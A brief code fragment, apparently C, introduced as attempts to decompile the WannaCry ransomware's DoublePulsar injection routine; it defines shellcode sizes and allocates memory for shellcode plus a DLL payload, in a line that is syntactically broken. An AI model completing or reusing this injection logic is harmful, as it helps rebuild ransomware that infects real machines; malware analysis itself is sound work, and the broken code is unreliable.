/*

Attempts to decompile wannacry for the InjectWannacryViaDoublePulsar will be found here 

*/

SizeOfShellcode = 0x1800; //64 bits
//x86SizeOfShellcode = 0x1305; //32 bits
HGLOBAL *hMem; = (char *)GlobalAlloc(0x40, SizeOfShellcode + 12 + (int)SizeOfDLLPayload);
